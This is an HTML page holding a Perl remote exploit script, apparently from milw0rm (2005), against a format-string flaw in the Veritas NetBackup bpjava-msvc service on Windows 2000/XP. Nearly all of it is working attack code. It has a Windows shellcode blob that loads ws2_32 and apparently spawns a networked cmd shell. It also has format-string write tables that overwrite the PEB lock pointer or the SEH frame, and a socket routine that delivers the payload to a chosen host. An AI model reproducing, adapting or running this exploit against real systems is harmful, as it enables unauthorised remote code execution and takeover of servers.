<html><head><title>Veritas NetBackup <= 6.0 (bpjava-msvc) Remote Exploit (win32)</title></head><pre>#!C:\Perl\bin\perl.exe -w
#
# Vertias Netbackup Win32 format string exploit
# Code By: johnh[at]digitalmunition[dot]com &amp; kf[at]digitalmunition[dot]com
#
# For win2k/xp pre sp2 we overwrote PEBFastlock -&gt; rtlentercritical
# For win xp sp2 we overwrote SEH
# http://www.digitalmunition.com/
#
# You may have to run this 2 times. 

use IO::Socket;
use Getopt::Std; getopts('h:p:t:', \ our %args);

if (defined($args{'h'})) { $host   = $args{'h'}; }
if (defined($args{'p'})) { $port   = $args{'p'}; }else{$port = 13722;}
if (defined($args{'t'})) { $target = $args{'t'}; }


print &quot;\n-=[Remote Veritas NetBackup Format String exploit]=-\n\n&quot;;
print &quot;\n-=[TagTeam johnh[at]digitalmunition[dot]com and kf_lists[at]digitalmunition[dot]com]=-\n\n&quot;;

if(!defined($host)){
print &quot;Usage:
        -h &lt;host&gt;
        -p port &lt;default 13722&gt;
        -t target:
            0 - Windows 2k/Windows XP SP0/SP1 - PEB
            1 - Windows XP SP2 - SEH\n\n&quot;;
exit(1);
}



my $sock = new IO::Socket::INET(PeerAddr =&gt; $host,PeerPort =&gt; $port,Proto    =&gt; 'tcp');
$sock or die &quot;no socket :$!&quot;;

# 970 chars in length. 








my $shellcode = &quot;\x90&quot;x100;
$shellcode .=
	&quot;\xeb\x42&quot;	.
	&quot;\x56&quot;.
	&quot;\x57&quot;.	
	&quot;\x8b\x45\x3c&quot;.	
	&quot;\x8b\x54\x05\x78&quot;.	
	&quot;\x01\xea&quot;	.
	&quot;\x52&quot;	.
	&quot;\x8b\x52\x20&quot;.	
	&quot;\x01\xea&quot;.	
	&quot;\x31\xc0&quot;.	
	&quot;\x31\xc9&quot;.	
	&quot;\x41&quot;	.
	&quot;\x8b\x34\x8a&quot;.	
	&quot;\x01\xee&quot;.	
	&quot;\x31\xff&quot;.	
	&quot;\xc1\xcf\x13&quot;	.
	&quot;\xac&quot;	.
	&quot;\x01\xc7&quot;.	
	&quot;\x85\xc0&quot;.	
	&quot;\x75\xf6&quot;.	
	&quot;\x39\xdf&quot;.	
	&quot;\x75\xea&quot;.	
	&quot;\x5a&quot;	.
	&quot;\x8b\x5a\x24&quot;	.
	&quot;\x01\xeb&quot;	.
	&quot;\x66\x8b\x0c\x4b&quot;.	
	&quot;\x8b\x5a\x1c&quot;	.
	&quot;\x01\xeb&quot;	.
	&quot;\x8b\x04\x8b&quot;	.
	&quot;\x01\xe8&quot;	.
	&quot;\x5f&quot;	.
	&quot;\x5e&quot;	.
	&quot;\xc3&quot;	.
	&quot;\xfc&quot;	.
	&quot;\x31\xc0&quot;.	
	&quot;\x64\x8b\x40\x30&quot;.	
	&quot;\x8d\x78\x20&quot;	.
	&quot;\x8b\x40\x0c&quot;	.
	&quot;\x8b\x70\x1c&quot;	.
	&quot;\xad&quot;	.
	&quot;\x8b\x68\x08&quot;.	
	&quot;\x89\xee&quot;.	
	&quot;\x31\xc0&quot;.	
	&quot;\x64\x8b\x40\x30&quot;.	
	&quot;\x8b\x40\x0c&quot;	.
	&quot;\x8b\x40\x1c&quot;	.
	&quot;\x8b\x68\x08&quot;	.
	&quot;\xbb\x6f\x5b\x8b\x9c&quot;.	
	&quot;\xe8\x8f\xff\xff\xff&quot;.	
	&quot;\xab&quot;	.
	&quot;\xbb\xe1\x0f\xfe\xb7&quot;.	
	&quot;\xe8\x84\xff\xff\xff&quot;.	
	&quot;\xab&quot;	.
	&quot;\x89\xf5&quot;.	
	&quot;\x31\xc0&quot;.	
	&quot;\x66\xb8\x6c\x6c&quot;.	
	&quot;\x50&quot;	.
	&quot;\x68\x33\x32\x2e\x64&quot;.	
	&quot;\x68\x77\x73\x32\x5f&quot;.	
	&quot;\x54&quot;	.
	&quot;\xbb\x71\xa7\xe8\xfe&quot;	.
	&quot;\xe8\x65\xff\xff\xff&quot;	.
	&quot;\xff\xd0&quot;	.
	&quot;\x89\xef&quot;	.
	&quot;\x89\xc5&quot;	.
	&quot;\x81\xc4\x70\xfe\xff\xff&quot;	.
	&quot;\x54&quot;	.
	&quot;\x31\xc0&quot;.	
	&quot;\xfe\xc4&quot;.	
	&quot;\x40&quot;	.
	&quot;\x50&quot;	.
	&quot;\xbb\x22\x7d\xab\x7d&quot;.	
	&quot;\xe8\x48\xff\xff\xff&quot;.	
	&quot;\xff\xd0&quot;	.
	&quot;\x31\xc0&quot;	.
	&quot;\x50&quot;	.
	&quot;\x50&quot;	.
	&quot;\x50&quot;	.
	&quot;\x50&quot;	.
	&quot;\x40&quot;	.
	&quot;\x50&quot;	.
	&quot;\x40&quot;	.
	&quot;\x50&quot;	.
	&quot;\xbb\xa6\x55\x34\x79&quot;.	
	&quot;\xe8\x32\xff\xff\xff&quot;.	
	&quot;\xff\xd0&quot;	.
	&quot;\x89\xc6&quot;	.
	&quot;\x31\xc0&quot;	.
	&quot;\x50&quot;	.
	&quot;\x50&quot;	.
	&quot;\x35\x02\x01\x70\xcc&quot;.	
	&quot;\xfe\xcc&quot;	.
	&quot;\x50&quot;	.
	&quot;\x89\xe0&quot;.	
	&quot;\x50&quot;	.
	&quot;\x6a\x10&quot;	.
	&quot;\x50&quot;	.
	&quot;\x56&quot;	.
	&quot;\xbb\x81\xb4\x2c\xbe&quot;	.
	&quot;\xe8\x11\xff\xff\xff&quot;	.
	&quot;\xff\xd0&quot;	.
	&quot;\x31\xc0&quot;	.
	&quot;\x50&quot;	.
	&quot;\x56&quot;	.
	&quot;\xbb\xd3\xfa\x58\x9b&quot;	.
	&quot;\xe8\x01\xff\xff\xff&quot;	.
	&quot;\xff\xd0&quot;	.
	&quot;\x58&quot;	.
	&quot;\x60&quot;	.
	&quot;\x6a\x10&quot;.	
	&quot;\x54&quot;	.
	&quot;\x50&quot;	.
	&quot;\x56&quot;	.
	&quot;\xbb\x47\xf3\x56\xc6&quot;.	
	&quot;\xe8\xee\xfe\xff\xff&quot;.	
	&quot;\xff\xd0&quot;	.
	&quot;\x89\xc6&quot;	.
	&quot;\x31\xdb&quot;	.
	&quot;\x53&quot;	.
	&quot;\x68\x2e\x63\x6d\x64&quot;.	
	&quot;\x89\xe1&quot;	.
	&quot;\x41&quot;	.
	&quot;\x31\xdb&quot;.	
	&quot;\x56&quot;	.
	&quot;\x56&quot;	.
	&quot;\x56&quot;	.
	&quot;\x53&quot;	.
	&quot;\x53&quot;	.
	&quot;\x31\xc0&quot;.	
	&quot;\xfe\xc4&quot;.	
	&quot;\x40&quot;	.
	&quot;\x50&quot;	.
	&quot;\x53&quot;	.
	&quot;\x53&quot;	.
	&quot;\x53&quot;	.
	&quot;\x53&quot;	.
	&quot;\x53&quot;	.
	&quot;\x53&quot;	.
	&quot;\x53&quot;	.
	&quot;\x53&quot;	.
	&quot;\x53&quot;	.
	&quot;\x53&quot;	.
	&quot;\x6a\x44&quot;.	
	&quot;\x89\xe0&quot;.	
	&quot;\x53&quot;	.
	&quot;\x53&quot;	.
	&quot;\x53&quot;	.
	&quot;\x53&quot;	.
	&quot;\x54&quot;	.
	&quot;\x50&quot;	.
	&quot;\x53&quot;	.
	&quot;\x53&quot;	.
	&quot;\x53&quot;	.
	&quot;\x43&quot;	.
	&quot;\x53&quot;	.
	&quot;\x4b&quot;	.
	&quot;\x53&quot;	.
	&quot;\x53&quot;	.
	&quot;\x51&quot;	.
	&quot;\x53&quot;	.
	&quot;\x87\xfd&quot; .	
	&quot;\xbb\x21\xd0\x05\xd0&quot;.	
	&quot;\xe8\xa8\xfe\xff\xff&quot;.	
	&quot;\xff\xd0&quot;	.
	&quot;\x5b&quot;	.
	&quot;\x31\xc0&quot;.	
	&quot;\x48&quot;	.
	&quot;\x50&quot;	.
	&quot;\x53&quot;	.
	&quot;\xbb\x43\xcb\x8d\x5f&quot;.	
	&quot;\xe8\x96\xfe\xff\xff&quot;.	
	&quot;\xff\xd0&quot;	.
	&quot;\x56&quot;	.
	&quot;\x87\xef&quot;.	
	&quot;\xbb\x12\x6b\x6d\xd0&quot;.	
	&quot;\xe8\x87\xfe\xff\xff&quot;.	
	&quot;\xff\xd0&quot;	.
	&quot;\x83\xc4\x5c&quot;	.
	&quot;\x61&quot;	.
	&quot;\xeb\x81&quot;;


#/*
#7FFDF250    54              PUSH ESP
#7FFDF251    5F              POP EDI
#7FFDF252    B8 90909090     MOV EAX,90909090
#7FFDF257    FD              STD 
#7FFDF258    F2:AF           REPNE SCAS DWORD PTR ES:[EDI]
#7FFDF25A    57              PUSH EDI
#7FFDF25B    C3              RETN
#
#and 
#
#over write FastPebLockRoutine pointer to EnterCriticalSection with our code address of 7FFDF250    
#
#7FFDF020    7FFDF250    
#
#*/

print &quot;TARGET IS $target\n&quot;;
if ($target == 0) {
$c = 8;
@fmt_array = (

#WINDOWS 2K SP4/XP SP0-SP1
#OVERWRITE PEB FASTLOCKPOINTER -&gt; RTLEnterCriticalSection
[ 0x7FFDF250, 0x7FFDF252, 0x7FFDF254, 0x7FFDF256, 0x7FFDF258, 0x7FFDF25A, 0x7FFDF022, 0x7FFDF020 ],
[ 0x5f54, 0x90b8, 0x9090, 0xfc90, 0xaff2, 0xc357, 0x7ffd, 0xf250 ],

);
}


if ($target == 1) {
$c = 10;
@fmt_array = (
#windows XP SP2
#OVERWRITE STATIC SEH FRAME

[ 0x7FFDF250, 0x7FFDF252, 0x7FFDF254, 0x7FFDF256, 0x7FFDF258, 0x7FFDF25A, 0x0012ffb0, 0x0012ffb2, 0x0012ffb6, 0x0012ffb4 ],
[ 0x5f54, 0x90b8, 0x9090, 0xfc90, 0xaff2, 0xc357, 0x9090,0x9090,0x7FFD, 0xF250 ],
);
}


my $offset = 0;
my $dump_fmt=6; #amount of %.8x needed to reach stackbase
my $payload; 
my $payload2;
my $hi; 
my $lo;  
my $last = 0;
my $flag = 2; 

my @shift;

for (my $y = 0; $y &lt; $c; $y = $y + 2)
{

$payload = &quot;%08x&quot; x $dump_fmt;
$payload2 = pack('l', $fmt_array[0][$y]) . &quot;AAAA&quot; . pack('l', $fmt_array[0][$y+1]);

$hi = $fmt_array[1][$y] - 0x2a - 35;
$lo = $fmt_array[1][$y+1] - $hi - 77;

$payload .= &quot;%$hi&quot; . &quot;x%hn%$lo&quot; . &quot;x%hn&quot;;

print $sock &quot; 118      1\nSNO space filler\n&quot;;
print scalar &lt;$sock&gt;;
print scalar &lt;$sock&gt;;

print $sock &quot; 101      6\n&quot; .   
&quot;$payload&quot; . &quot;\n&quot; . # You must finish the line off with a line feed. 
&quot;dummy space\n&quot; . 
&quot;$shellcode\n&quot; . 
&quot;$payload2&quot; . &quot;\n&quot; . 
&quot;spare bits\n&quot; . 
&quot;spare bits\n\n&quot;;


print scalar &lt;$sock&gt;;
print scalar &lt;$sock&gt;;

}


if ($target == 1)
{
#create exception so SEH is called
print $sock &quot; 118      1\nSNO space filler\n&quot;;
print scalar &lt;$sock&gt;;
print scalar &lt;$sock&gt;;

print $sock &quot; 101      6\n&quot; .   
&quot;%n&quot; . &quot;\n&quot; . # You must finish the line off with a line feed. 
&quot;dummy space\n&quot; . 
&quot;$shellcode\n&quot; . 
&quot;AAAAAAAAAAAA&quot; . &quot;\n&quot; . 
&quot;spare bits\n&quot; . 
&quot;spare bits\n\n&quot;;


print scalar &lt;$sock&gt;;
print scalar &lt;$sock&gt;;

}


close $sock;

# milw0rm.com [2005-10-20]</pre></html>